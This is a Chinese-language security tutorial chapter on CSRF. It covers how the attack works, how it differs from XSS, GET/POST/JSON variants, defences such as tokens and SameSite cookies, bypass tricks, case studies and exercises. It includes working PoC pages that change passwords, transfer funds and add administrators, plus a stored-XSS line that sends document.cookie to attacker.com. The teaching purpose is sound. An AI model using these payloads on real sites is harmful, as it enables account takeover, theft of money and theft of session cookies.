---
outline: deep
---

# 第32章 CSRF跨站请求伪造

> **难度等级：🟡 中等级**
>
> **预计学习时间：120分钟**
>
> **本章看点：CSRF原理详解、CSRF vs XSS区别、CSRF攻击场景、GET/POST/JSON三种CSRF、CSRF POC构造、CSRF防御措施、CSRF绕过技巧、CSRF与XSS组合利用**
>
> ::: tip 说明
> 恭喜你进入CSRF与SSRF模块！
>
> 这两个漏洞名字很像，
> 都带"SRF"，
> 但其实完全不一样。
>
> 这一章我们先讲 **CSRF（跨站请求伪造）**。
>
> CSRF是一个很有意思的漏洞，
> 它不偷你的数据，
> 它**借用你的身份**，
> 以你的名义去干坏事。
>
> 比如：
> - 你登录了网银，
>   然后访问了一个恶意网站，
>   结果你的钱被转走了...
> - 你登录了后台，
>   然后点了个链接，
>   结果管理员密码被改了...
>
> 这就是CSRF的威力。
>
> 这一章，
> 我们就来好好聊聊这个
> "借刀杀人"的漏洞。
> :::

---

## 📖 本章概述

::: tip 写在前面
很多新手搞不清CSRF和XSS的区别，
毕竟都带个"跨站"。

简单来说：
- **XSS**：攻击者注入脚本，在用户浏览器执行，偷数据、偷Cookie
- **CSRF**：攻击者构造请求，借用用户身份，执行操作（转账、改密码等）

XSS是"我替你执行"，
CSRF是"我让你自己执行"。

CSRF的核心在于：
> **浏览器会自动带上Cookie，
> 所以只要用户登录了，
> 攻击者构造的请求就会带上用户的Cookie，
> 服务器就会认为是用户本人在操作。**

这一章我们会学习：
- 什么是CSRF
- CSRF的原理
- CSRF vs XSS的区别
- CSRF能做什么
- CSRF攻击的条件
- GET型、POST型、JSON型CSRF
- 怎么构造CSRF POC
- CSRF的防御措施
- CSRF绕过技巧
- CSRF与XSS的组合利用

准备好了吗？
开始吧！
:::

---

## 🎯 学习目标

读完本章，你将能够：

- [x] 理解CSRF漏洞的原理
- [x] 区分CSRF和XSS的不同
- [x] 掌握GET型CSRF的利用
- [x] 掌握POST型CSRF的利用
- [x] 了解JSON型CSRF
- [x] 会构造CSRF POC
- [x] 理解CSRF的防御措施
- [x] 掌握常见的CSRF绕过技巧
- [x] 理解CSRF与XSS的组合利用
- [x] 能识别和验证CSRF漏洞

---

## 🔍 什么是CSRF？

### 0.0 通俗理解：CSRF就是"借刀杀人"

用一个超级通俗的场景来理解CSRF：

**场景：寄快递**

你在公司上班，你的工牌放在桌上。
你出去上了个厕所（没有退登录）。

这时，小明（攻击者）走进来，拿起你的工牌（你的Cookie），
去前台说："我是xxx，帮我把这封邮件寄给老板。"

前台一看：工牌是真的（Cookie有效），
这个人说自己是xxx（请求里带着你的身份），
好，就帮他寄了。

**整个过程：**
- 小明没有偷走你的工牌（没有窃取Cookie）
- 小明只是在你离开的时候"借用"了你的身份
- 操作成功了，但你自己完全不知情

**把上面的场景翻译成Web语言：**

1. 你登录了银行网站 `bank.com`，浏览器里有了你的登录Cookie
2. 你没退出银行，打开了另一个Tab，访问了一个"可爱猫咪图片"网站
3. 这个图片网站的网页里，藏了这样一行代码：
   ```html
   <img src="http://bank.com/transfer?to=attacker&amount=10000">
   ```
4. 浏览器看到 `src="http://bank.com/..."`，就去加载这个"图片"
5. 浏览器访问 `bank.com` 时，自动带上了你的Cookie
6. 银行服务器收到请求，检查Cookie → 是你！那就执行转账！

**你只是在看猫咪图片，钱就没了。**

> **CSRF的核心矛盾：**
> 服务器通过Cookie来判断"是不是你"。
> 浏览器看到任何需要向某域名发起的请求，都会自动带上Cookie。
> 攻击者只要想办法让你的浏览器发一个"看起来正常"的请求到目标网站，
> 你这个"无辜的用户"就"帮"攻击者完成了操作。

### 1.1 概念

**CSRF（Cross-Site Request Forgery，跨站请求伪造），
是指攻击者诱导用户在已登录的Web应用中，
执行非预期的操作。**

说人话就是：
> 你登录了网站A，
> 然后你访问了恶意网站B，
> 网站B偷偷向网站A发了一个请求，
> 因为你还登录着A，
> 浏览器自动带上了A的Cookie，
> 所以A网站以为是你本人在操作，
> 就执行了这个请求。

整个过程中，
攻击者**没有拿到你的Cookie**，
也**没有看到你的数据**，
他只是**借用了你的身份**，
让你自己"帮忙"执行了某个操作。

这就是CSRF——
**借刀杀人，借你的登录状态干坏事。**

### 1.2 一个简单的例子

让我们用一个最经典的场景来理解：
**修改密码。**

假设某网站修改密码的接口是：
```
GET /change_password.php?newpass=123456
```

用户登录后，
访问这个URL就能把密码改成123456。

现在，
攻击者在自己的恶意网站上，
放了这么一张图片：
```html
<img src="http://target.com/change_password.php?newpass=hacker123">
```

当登录了target.com的用户，
访问攻击者的恶意网站时，
浏览器会自动去加载这张图片，
也就是向 `change_password.php` 发请求。

因为用户已经登录了，
浏览器自动带上了target.com的Cookie，
服务器一看：
"哦，这用户登录了，他要改密码。"
于是就把密码改成了hacker123。

用户毫不知情，
密码就被改了！

这就是最简单的CSRF攻击。

### 1.3 CSRF的本质

CSRF的本质可以用一句话概括：

> **浏览器自动带Cookie + 跨站请求能发出去 = 身份被冒用**

为什么跨站请求能发出去？
因为HTML中的 `<img>`、`<script>`、`<iframe>` 等标签，
可以跨域加载资源，
浏览器不会阻止。
（这是浏览器的同源策略决定的，
同源策略限制的是**读取**响应，
而不是**发送**请求）

---

## 🆚 CSRF vs XSS，有啥不一样？

很多新手分不清CSRF和XSS，
毕竟都有"跨站"。
我们来详细对比一下。

### 2.1 核心区别

| 对比项 | XSS（跨站脚本） | CSRF（跨站请求伪造） |
|--------|----------------|---------------------|
| **核心** | 注入脚本，执行JS代码 | 伪造请求，借用身份 |
| **手段** | 注入恶意JS | 构造恶意请求 |
| **是否需要JS** | 是（注入JS） | 否（可以用img等标签） |
| **攻击者能做什么** | 偷Cookie、偷数据、挂马、篡改页面 | 执行用户有权限的操作（转账、改密码等） |
| **攻击者是否拿到数据** | 是（能偷到数据） | 否（只是借身份执行操作，看不到结果） |
| **危害方向** | 客户端（用户浏览器） | 服务端（执行操作） |
| **依赖** | 依赖注入点 | 依赖用户的登录状态 |

### 2.2 一个比喻来理解

- **XSS**：攻击者偷偷溜进你家，把你家东西都偷走了
- **CSRF**：攻击者冒充你的身份，让你老婆把钱转给他了（你自己还不知道）

### 2.3 两者的关系

CSRF和XSS不是对立的，
它们经常**组合使用**：

**XSS可以打CSRF：**
如果有XSS漏洞，
攻击者可以注入JS代码，
用JS来发起CSRF请求，
这样更灵活，
也更容易绕过防御。

**CSRF可以辅助XSS：**
比如CSRF修改管理员密码，
然后攻击者登录管理员账号，
再去后台找XSS漏洞，
或者直接上传Shell。

我们后面会专门讲XSS+CSRF的组合利用。

---

## 💥 CSRF能做什么？

CSRF能做什么，
取决于用户有什么权限，
以及网站有什么功能。

### 3.1 常见的CSRF攻击场景

| 场景 | 例子 |
|------|------|
| **账号操作** | 修改密码、修改邮箱、修改个人信息 |
| **转账/支付** | 银行转账、支付宝付款、充值 |
| **管理员操作** | 添加管理员、删除用户、修改配置 |
| **社交操作** | 发微博、加关注、点赞、转发 |
| **购物操作** | 添加购物车、下单、修改收货地址 |
| **其他** | 投票、评分、留言、上传头像 |

**原则：**
> 用户能做什么，
> CSRF就能做什么。
> 因为CSRF就是借用用户的身份。

### 3.2 CSRF的危害等级

CSRF的危害可大可小，
取决于被攻击的功能：

| 危害等级 | 场景 | 说明 |
|----------|------|------|
| 🟢 低危 | 点赞、关注、投票 | 影响不大 |
| 🟡 中危 | 修改个人信息、发帖 | 有一定影响 |
| 🟠 高危 | 修改密码、转账、支付 | 严重 |
| 🔴 严重 | 管理员添加用户、修改系统配置 | 极其严重 |

---

## ⚠️ CSRF攻击的条件

不是所有网站都能打CSRF，
需要满足几个条件：

### 4.1 必要条件

1. **用户已登录目标网站**
   - 没有登录的话，就没有身份可以冒用
   
2. **目标网站存在敏感操作**
   - 比如修改密码、转账等
   - 如果网站啥也干不了，CSRF也没用

3. **操作只依赖Cookie认证**
   - 服务器只通过Cookie来识别用户身份
   - 没有其他验证（比如Token、验证码等）

4. **攻击者能构造出有效的请求**
   - 知道请求的URL、参数
   - 参数是可预测的

### 4.2 为什么浏览器会自动带Cookie？

这是浏览器的机制：
> 只要是向某个域名发请求，
> 浏览器就会自动带上这个域名的Cookie，
> 不管请求是从哪个页面发起的。

这就是CSRF能够成立的根本原因。

比如：
- 你在A网站登录了，有A的Cookie
- 你打开B网站，B网站里有个图片指向A
- 浏览器加载这张图片的时候，
  会自动带上A的Cookie
- A网站收到请求，一看有Cookie，
  以为是你在操作

---

## 🛠️ CSRF的几种攻击方式

CSRF根据请求方式的不同，
可以分为几种类型：
- GET型CSRF
- POST型CSRF
- JSON型CSRF

我们一个个来讲。

### 5.1 GET型CSRF

这是最简单的CSRF，
也是最常见的。

**原理：**
用 `<img>`、`<script>`、`<iframe>` 等标签，
自动发起GET请求。

**最简单的POC：**
```html
<img src="http://target.com/change_pass.php?newpass=hacker">
```

只要用户访问了含有这段代码的页面，
图片就会加载，
请求就会发出去，
CSRF就完成了。

**其他可用的标签：**
```html
<!-- img标签 -->
<img src="http://target.com/xxx">

<!-- script标签 -->
<script src="http://target.com/xxx"></script>

<!-- link标签 -->
<link rel="stylesheet" href="http://target.com/xxx">

<!-- iframe标签 -->
<iframe src="http://target.com/xxx" style="display:none"></iframe>
```

**特点：**
- 最简单，最容易实现
- 只适用于GET请求
- 隐蔽性好（用户看不到）
- 但有些浏览器可能会拦截（比如有些CSP设置）

### 5.2 POST型CSRF

如果目标操作是POST请求，
那就不能简单用img标签了，
需要用其他方法。

#### 方法1：自动提交的表单

用JavaScript让表单自动提交：

```html
<form id="csrf_form" action="http://target.com/change_pass.php" method="POST">
  <input type="hidden" name="newpass" value="hacker123">
</form>
<script>
  document.getElementById('csrf_form').submit();
</script>
```

用户访问这个页面，
表单会自动提交，
发起POST请求，
CSRF攻击完成。

#### 方法2：用XMLHttpRequest/fetch

用JS发AJAX请求：

```html
<script>
fetch('http://target.com/change_pass.php', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'newpass=hacker123',
  credentials: 'include'  // 带上Cookie
});
</script>
```

不过这种方式可能会被CORS拦截，
而且需要JavaScript支持。

#### 方法3：用iframe + form

可以把表单放在iframe里，
这样用户看不到跳转：

```html
<iframe name="hidden_iframe" style="display:none"></iframe>
<form target="hidden_iframe" action="http://target.com/change_pass.php" method="POST">
  <input type="hidden" name="newpass" value="hacker123">
</form>
<script>
  document.forms[0].submit();
</script>
```

**POST型CSRF特点：**
- 适用于POST请求
- 需要JavaScript（或者用户点击）
- 比GET型稍复杂
- 也比较常见

### 5.3 JSON型CSRF

如果目标接口接收的是JSON格式的数据，
也就是Content-Type是 `application/json`，
那普通的form表单就不行了，
因为form表单的Content-Type是 `application/x-www-form-urlencoded`。

这时候怎么办呢？

#### 方法1：用fetch/XHR + CORS

```javascript
fetch('http://target.com/api/change_pass', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({newpass: 'hacker123'}),
  credentials: 'include'
});
```

但是这种方式会触发CORS预检请求（OPTIONS），
如果服务器没有配置CORS允许跨域，
就会失败。

#### 方法2：利用307重定向

有些情况下可以用307重定向，
不过比较复杂，
实战中用得不多。

#### 方法3：Flash/Java Applet

老方法了，
现在基本不用了。

**JSON型CSRF特点：**
- 利用难度较高
- 很多时候受CORS限制
- 但如果服务器配置不当，也是可能的

### 5.4 三种类型对比

| 类型 | GET型 | POST型 | JSON型 |
|------|-------|--------|--------|
| **请求方式** | GET | POST | POST (JSON) |
| **实现难度** | 简单 | 中等 | 较难 |
| **是否需要JS** | 不需要 | 需要（或用户点击） | 需要 |
| **常见程度** | 很常见 | 常见 | 较少 |
| **隐蔽性** | 高 | 中 | 中 |

---

## 📝 CSRF POC构造

说了这么多理论，
我们来看看实际怎么构造CSRF POC。

### 6.1 GET型POC

最简单的，用img标签：

```html
<!DOCTYPE html>
<html>
<head>
  <title>CSRF POC</title>
</head>
<body>
  <h1>页面加载中...</h1>
  <img src="http://target.com/change_password.php?newpass=hacker123" style="display:none">
</body>
</html>
```

### 6.2 POST型POC（自动提交表单）

最经典的POST CSRF POC：

```html
<!DOCTYPE html>
<html>
<head>
  <title>CSRF POC</title>
</head>
<body>
  <h1>请稍候...</h1>
  <form id="csrf" action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="oldpass" value="">
    <input type="hidden" name="newpass" value="hacker123">
    <input type="hidden" name="newpass2" value="hacker123">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

### 6.3 POST型POC（需要用户点击）

如果不能用JS自动提交，
可以诱导用户点击：

```html
<!DOCTYPE html>
<html>
<head>
  <title>领取红包</title>
</head>
<body>
  <h1>恭喜你获得100元红包！</h1>
  <p>点击下方按钮领取：</p>
  <form action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="newpass" value="hacker123">
    <button type="submit" style="font-size:24px; padding:20px;">
      立即领取
    </button>
  </form>
</body>
</html>
```

用户以为点的是"领取红包"，
实际上提交的是修改密码的表单。
这就是典型的**社工 + CSRF**组合。

### 6.4 快速生成POC的工具

- **Burp Suite**：右键 → Engagement tools → Generate CSRF PoC
- **CSRF Tracker**：浏览器插件
- 自己写脚本生成

Burp的CSRF POC生成器非常好用，
推荐大家试试。

---

## 🛡️ CSRF防御措施

讲完攻击，
我们来讲讲防御。
攻防一体才能真正理解。

### 7.1 防御方法总览

| 防御方法 | 原理 | 安全性 | 推荐度 |
|----------|------|--------|--------|
| **Token验证** | 请求中带随机Token，服务器校验 | 高 | ⭐⭐⭐⭐⭐ 最推荐 |
| **验证码** | 关键操作需要输入验证码 | 高 | ⭐⭐⭐⭐ 推荐 |
| **Referer验证** | 检查请求来源 | 中 | ⭐⭐ 不推荐（可绕过） |
| **SameSite Cookie** | Cookie设置SameSite属性 | 中高 | ⭐⭐⭐⭐ 推荐（浏览器支持） |
| **二次确认** | 敏感操作需要再次确认（如输入密码） | 高 | ⭐⭐⭐⭐ 推荐 |
| **限制请求方式** | 敏感操作只用POST | 低 | ⭐ 不够 |

### 7.2 Token验证（最推荐）

**原理：**
在表单中加入一个随机的Token（令牌），
提交的时候带上这个Token，
服务器验证Token是否正确。

因为攻击者不知道Token是什么，
所以构造不出有效的请求，
CSRF就失效了。

**示例（PHP）：**
```php
<?php
session_start();

// 生成Token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 处理表单提交
if ($_POST) {
    // 验证Token
    if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF token验证失败！");
    }
    // Token验证通过，处理业务逻辑
    // ...
}
?>

<form method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    新密码：<input type="password" name="newpass">
    <button type="submit">修改密码</button>
</form>
```

**关键点：**
- Token要随机、不可预测
- 每个用户（每个session）一个Token
- 放在表单的隐藏字段中，或者请求头中
- 服务器严格校验

**常见的Token实现：**
- 同步令牌模式（Synchronizer Token Pattern）
- 双重提交Cookie（Double Submit Cookie）
- Encrypted Token Pattern
- 等等...

### 7.3 验证码

**原理：**
关键操作需要输入验证码（图形验证码、短信验证码等），
攻击者不知道验证码是什么，
所以无法构造有效请求。

**优点：**
- 安全性高
- 实现简单

**缺点：**
- 用户体验不好（每次都要输验证码）
- 不能每个操作都加验证码
- 验证码本身也可能被绕过（识别验证码等）

**适用场景：**
- 登录、注册
- 转账、支付
- 修改密码
- 等非常敏感的操作

### 7.4 Referer验证

**原理：**
检查请求的Referer头，
看是不是从本站的页面发起的。
如果Referer是第三方网站，
就拒绝。

**示例（PHP）：**
```php
<?php
// 检查Referer
$allowed_host = 'target.com';
$referer = $_SERVER['HTTP_REFERER'];

if (strpos($referer, $allowed_host) === false) {
    die("非法请求！");
}
// 处理业务逻辑
?>
```

**问题：**
- Referer可以被伪造/隐藏
- 某些浏览器/场景下没有Referer
- 可以绕过（比如Referer检查不严谨）
- 安全性不如Token

所以**不推荐单独使用Referer验证**，
可以作为辅助手段。

### 7.5 SameSite Cookie

**原理：**
给Cookie设置 `SameSite` 属性，
限制跨站请求是否携带Cookie。

**SameSite有三个值：**
- `Strict`：最严格，完全不允许跨站带Cookie
- `Lax`：宽松一些，GET请求可以带，POST不行
- `None`：不限制（需要同时设置Secure）

**示例：**
```http
Set-Cookie: sessionid=xxx; SameSite=Strict; Secure
```

**优点：**
- 浏览器层面的防御
- 不需要改业务代码（只需要改Cookie设置）
- 越来越多的浏览器默认开启

**缺点：**
- 老浏览器不支持
- 可能影响正常的跨站功能
- 不是100%可靠（有绕过方法）

### 7.6 二次确认

**原理：**
敏感操作需要用户再次确认，
确保是用户本人在操作。

**常见的二次确认方式：**
- 修改密码需要输入原密码
- 转账需要输入支付密码
- 删除数据前弹出确认框
- 重要操作需要短信验证码
- 等等

**优点：**
- 安全性高，攻击者很难绕过
- 用户体验还可以接受（只在关键操作时出现）

**缺点：**
- 每个敏感操作都要加，开发工作量大
- 用户每次都要输入，有点麻烦

### 7.7 防御的最佳实践

1. **首选：Token验证**（每个请求带随机Token）
2. **辅助：SameSite Cookie**（浏览器层面防御）
3. **补充：Referer检查**（作为额外一层）
4. **敏感操作：验证码 + 二次确认**
5. **重要操作：要求输入密码**

**多层防御，纵深防御！**

---

## 🔓 CSRF绕过技巧

有攻击就有防御，
有防御就有绕过。
我们来看看常见的CSRF绕过技巧。

### 8.1 绕过Token验证

Token验证是最常用的防御，
那有没有办法绕过呢？

#### 情况1：Token没有严格校验
- Token为空也能过
- Token随便填一个就行
- Token校验不严格（比如只检查长度）

#### 情况2：Token可以预测
- Token是可预测的（比如用时间戳、用户名等生成）
- 那攻击者可以预测出Token，然后构造请求

#### 情况3：Token泄露
- 如果有XSS漏洞，可以偷到Token
- Token在URL中（可能通过Referer泄露）
- 等等

#### 情况4：Token只验证存在，不验证值
有些开发只判断Token有没有，
不判断对不对，
那随便填一个就行。

### 8.2 绕过Referer验证

Referer验证比较容易绕过，
我们来看看常见的绕过方法：

#### 方法1：不发送Referer
有些情况下可以让浏览器不发送Referer，
比如：
- 使用 `<meta name="referrer" content="no-referrer">`
- 使用 `referrerpolicy="no-referrer"` 属性
- 使用data URL
- 使用HTTPS到HTTP的跳转（有些浏览器不发Referer）

如果服务器判断"没有Referer就拒绝"，
那这招不行。
但如果服务器判断"Referer不对就拒绝"，
而没有Referer的时候又默认放行，
那就可以绕过了。

#### 方法2：Referer检查不严谨
比如服务器只检查Referer里有没有"target.com"，
那攻击者可以构造这样的域名：
```
http://target.com.attacker.com/
http://attacker.com/?target.com
http://attacker.com/target.com/
```
这些Referer里都包含"target.com"，
如果检查不严谨就会绕过。

#### 方法3：利用跳转
如果目标网站有一个跳转功能，
可以跳转到任意URL，
那可以让请求从目标网站的跳转页面发起，
这样Referer就是目标网站自己的。

### 8.3 绕过SameSite Cookie

SameSite Cookie也不是万能的，
有些情况下可以绕过：
- 利用浏览器的bug
- 利用子域名
- 利用某些特殊的场景
- 等等

不过这些都比较复杂，
实战中也比较少见，
了解一下就行。

### 8.4 其他绕过思路

- **利用XSS**：有XSS的话，CSRF防御形同虚设
- **利用JSONP**：如果有JSONP接口，可以偷Token
- **利用子域名**：子域名上的XSS可以打主站的CSRF

---

## 🤝 CSRF与XSS的组合利用

CSRF和XSS是好兄弟，
经常一起出现。

### 9.1 XSS可以打CSRF

如果有XSS漏洞，
那CSRF就变得非常简单了，
因为：
- 可以直接用JS发请求
- 可以自动获取Token
- 可以绕过很多防御

**示例：**
```javascript
// XSS注入的代码
// 1. 先获取Token
var token = document.getElementsByName('csrf_token')[0].value;

// 2. 然后构造CSRF请求
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/change_pass.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('newpass=hacker123&csrf_token=' + token);
```

因为是在同一个页面注入的XSS，
所以能拿到页面上的Token，
然后带着Token发请求，
CSRF防御就被绕过了。

**所以说：XSS > CSRF防御**
有XSS的话，
CSRF的Token防御基本没用。

### 9.2 CSRF可以辅助XSS

反过来，
CSRF也可以辅助XSS，
比如：
- 用CSRF添加管理员账号
- 然后用管理员身份登录后台
- 在后台找XSS漏洞
- 或者直接上传Shell

### 9.3 CSRF蠕虫

如果一个网站既有存储型XSS，
又有CSRF漏洞，
那就可以构造出**CSRF蠕虫**：

- 用户A访问了有XSS的页面
- XSS代码自动发CSRF请求，让用户A发帖
- 帖子内容又包含XSS代码
- 用户B看了A的帖子，又中招
- 这样一传十，十传百...
- 就形成了蠕虫

以前很多社交网站都出过这种漏洞，
危害非常大。

---

## 📚 案例讲解

讲了这么多理论，
我们来看几个真实的案例。

### 案例1：修改用户密码的CSRF

**场景描述：**
某网站修改密码功能存在CSRF漏洞。

**漏洞详情：**
修改密码的接口：
```
POST /change_password.php
参数：oldpass=&newpass=123456&newpass2=123456
```

问题：
- 只有Cookie认证
- 没有Token
- 没有验证码
- 没有Referer检查

**利用方法：**

攻击者构造CSRF POC页面：
```html
<!DOCTYPE html>
<html>
<body>
  <form id="f" action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="oldpass" value="">
    <input type="hidden" name="newpass" value="hacker123">
    <input type="hidden" name="newpass2" value="hacker123">
  </form>
  <script>document.getElementById('f').submit();</script>
</body>
</html>
```

**攻击过程：**
1. 用户登录了target.com
2. 用户被诱导访问攻击者的POC页面
3. 页面自动提交表单
4. 用户的密码被改成hacker123
5. 攻击者用新密码登录用户账号

**修复方案：**
- 添加CSRF Token验证
- 修改密码需要输入原密码
- 敏感操作加验证码

---

### 案例2：转账功能的CSRF攻击

**场景描述：**
某网上银行的转账功能存在CSRF漏洞。

**漏洞详情：**
转账接口：
```
POST /transfer.php
参数：to_user=xxx&amount=1000
```

没有任何CSRF防御。

**利用方法：**

攻击者构造恶意页面，
放在自己的网站上：
```html
<!DOCTYPE html>
<html>
<head>
  <title>精彩内容，点击查看</title>
</head>
<body>
  <h1>劲爆消息！点击查看详情</h1>
  
  <form id="f" action="http://bank.com/transfer.php" method="POST">
    <input type="hidden" name="to_user" value="hacker">
    <input type="hidden" name="amount" value="10000">
  </form>
  
  <button onclick="document.getElementById('f').submit()" 
          style="font-size:30px; padding:30px;">
    点击查看
  </button>
</body>
</html>
```

**攻击过程：**
1. 用户登录了网上银行
2. 用户收到攻击者发的链接，点了进去
3. 用户看到"点击查看"按钮，好奇点了一下
4. 实际上提交了转账表单
5. 10000块钱转到了攻击者账户
6. 用户还以为点的是看内容的按钮...

**为什么会成功？**
- 用户登录了银行网站（有Cookie）
- 用户点击了按钮（提交表单）
- 浏览器自动带上银行的Cookie
- 服务器以为是用户本人在转账

**修复方案：**
- 加CSRF Token
- 转账需要输入支付密码
- 加短信验证码
- 加二次确认

---

### 案例3：CSRF配合XSS的组合拳

**场景描述：**
某论坛有存储型XSS漏洞，
同时管理员后台有CSRF漏洞。

**攻击过程：**

**第一步：存储型XSS打普通用户**
攻击者在论坛发了一个帖子，
内容里藏了XSS代码：
```javascript
<script>
// 偷用户的Cookie（或者直接发请求）
var img = document.createElement('img');
img.src = 'http://attacker.com/steal?c=' + document.cookie;
</script>
```

普通用户看帖就中招。

**第二步：XSS打管理员，添加管理员账号**
但攻击者想要的是管理员权限。
怎么让管理员中招呢？
- 给管理员发私信（带XSS）
- 或者管理员自己看到了这个帖子

管理员一打开帖子，
XSS就执行了：
```javascript
<script>
// 用XSS发CSRF请求，添加管理员
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://bbs.com/admin/add_admin.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;

// 先获取Token（因为在同一个页面，可以直接拿）
var token = document.querySelector('meta[name="csrf-token"]').content;

// 发送添加管理员的请求
xhr.send('username=hacker&password=123456&token=' + token);
</script>
```

**第三步：攻击者登录管理员账号**
攻击者用新加的管理员账号登录后台，
然后：
- 上传WebShell
- 提权
- 内网渗透
- ...

**总结：**
这就是 **存储型XSS + CSRF** 的组合拳，
威力巨大！

---

### 案例4：CSRF Token绕过

**场景描述：**
某网站做了CSRF Token防御，
但被绕过了。

**漏洞详情：**
网站每个表单都有CSRF Token，
看起来挺安全的。

但是！
Token的校验有问题：
- 只校验Token是否存在
- 不校验Token的值对不对
- 或者Token是可预测的

**绕过方法：**

**情况1：只校验存在，不校验值**
随便填一个Token就行：
```html
<form action="http://target.com/change_pass.php" method="POST">
  <input type="hidden" name="csrf_token" value="随便填">
  <input type="hidden" name="newpass" value="hacker">
</form>
```

**情况2：Token可预测**
比如Token是用 `md5(用户名+时间戳)` 生成的，
那攻击者可以预测出来，
然后构造请求。

**情况3：Token在URL中，通过Referer泄露**
如果Token在URL参数里，
那页面上的图片、链接等，
在请求的时候会通过Referer把Token泄露出去。

比如：
```
http://target.com/change_pass.php?token=abc123
```
这个页面里有个外链图片：
```html
<img src="http://attacker.com/1.jpg">
```
那加载图片的时候，
Referer头里就会带上这个URL，
攻击者就能从Referer里拿到Token了。

**修复建议：**
- Token要随机、不可预测
- 严格校验Token的值
- Token不要放在URL里，放在请求体或请求头中

---

### 案例5：CSRF蠕虫

**场景描述：**
某社交网站有存储型XSS + CSRF漏洞，
导致CSRF蠕虫爆发。

**漏洞详情：**
- 发微博功能有存储型XSS
- 关注用户功能有CSRF漏洞

**蠕虫原理：**

攻击者发了一条微博，
内容是：
```javascript
<script>
// 1. 自动发一条新微博（内容就是这段代码本身）
// 2. 自动关注攻击者账号
// 3. 自动转发这条微博

// 这样每个看到这条微博的用户都会中招
// 然后他们的粉丝又会看到...
// 指数级扩散！
</script>
```

**传播过程：**
1. 攻击者发第一条微博
2. 用户A看到，中招 → 自动发微博 + 关注攻击者
3. 用户A的粉丝看到A发的微博，中招
4. 粉丝的粉丝又中招
5. ...
6. 一传十，十传百，百传千...

短短几个小时，
就有几十万用户中招，
这就是**CSRF蠕虫**的威力。

**历史上真实的案例：**
- 2005年，MySpace的Samy蠕虫
- 2009年，Twitter的CSRF蠕虫
- 等等

---

## ✏️ 课后习题

### 选择题

1. CSRF的全称是什么？
   - A. Cross-Site Scripting
   - B. Cross-Site Request Forgery
   - C. Server-Side Request Forgery
   - D. Cross-Site Script Inclusion

2. 以下哪个是CSRF的特点？
   - A. 攻击者可以偷到用户的Cookie
   - B. 攻击者可以看到响应内容
   - C. 攻击者借用用户的身份执行操作
   - D. 攻击者需要注入JS代码

3. CSRF和XSS的主要区别是什么？
   - A. 没区别，都是跨站攻击
   - B. XSS是执行脚本，CSRF是伪造请求借身份
   - C. CSRF比XSS危害大
   - D. XSS只能打GET，CSRF只能打POST

4. 以下哪种方法是CSRF最推荐的防御措施？
   - A. Referer验证
   - B. 验证码
   - C. Token验证
   - D. 过滤特殊字符

5. GET型CSRF最简单的POC用什么标签？
   - A. `<div>`
   - B. `<img>`
   - C. `<table>`
   - D. `<p>`

### 填空题

1. CSRF的中文全称是 _______。

2. CSRF的核心是借用用户的 _______ 来执行操作。

3. GET型CSRF最常用的HTML标签是 _______。

4. CSRF最推荐的防御方法是 _______ 验证。

5. Cookie的 _______ 属性可以在浏览器层面防御CSRF。

### 简答题

1. 简述CSRF漏洞的原理。
2. CSRF和XSS有什么区别和联系？
3. CSRF攻击需要满足哪些条件？
4. 列举至少3种CSRF的防御方法，并简述原理。
5. 什么是CSRF蠕虫？它为什么能传播？

### 实操题

1. 在DVWA靶场中完成CSRF的low级别练习。
2. 练习构造GET型和POST型CSRF POC。
3. 尝试在DVWA的medium和high级别中绕过防御。
4. 自己写一个存在CSRF漏洞的简单网站（用于学习），然后自己打自己。
5. 了解Burp Suite中生成CSRF POC的功能。

---

## 📝 本章小结

这一章我们学习了CSRF跨站请求伪造漏洞，
内容非常丰富，
让我们来总结一下：

### 核心概念
- **CSRF（跨站请求伪造）**：借用用户身份，让用户自己执行非预期操作
- **原理**：浏览器自动带Cookie + 跨站能发请求 = 身份被冒用
- **核心**：攻击者看不到响应，只是借身份执行操作

### CSRF vs XSS
- **XSS**：注入脚本，执行JS，偷数据，偷Cookie
- **CSRF**：伪造请求，借身份，执行操作
- 两者经常组合使用

### CSRF的类型
- **GET型**：最简单，img等标签
- **POST型**：表单自动提交
- **JSON型**：fetch/XHR，可能受CORS限制

### 防御措施
1. **Token验证**（最推荐）
2. **验证码**（敏感操作）
3. **SameSite Cookie**（浏览器层面）
4. **二次确认**（输入密码等）
5. **Referer验证**（不推荐单独用）

### 绕过技巧
- Token校验不严格 / 可预测 / 泄露
- Referer检查不严谨
- SameSite有绕过方法
- **XSS可以绕过所有CSRF防御**

### 组合利用
- XSS + CSRF：威力巨大
- CSRF蠕虫：指数级传播

下一章我们会学习另一个带"SRF"的漏洞：
**SSRF服务端请求伪造**，
名字很像，但完全不一样，
敬请期待！

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day036-advanced-文件包含模块总结)
- [➡️ 下一章：---](/redteam/day038-advanced-SSRF服务端请求伪造)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
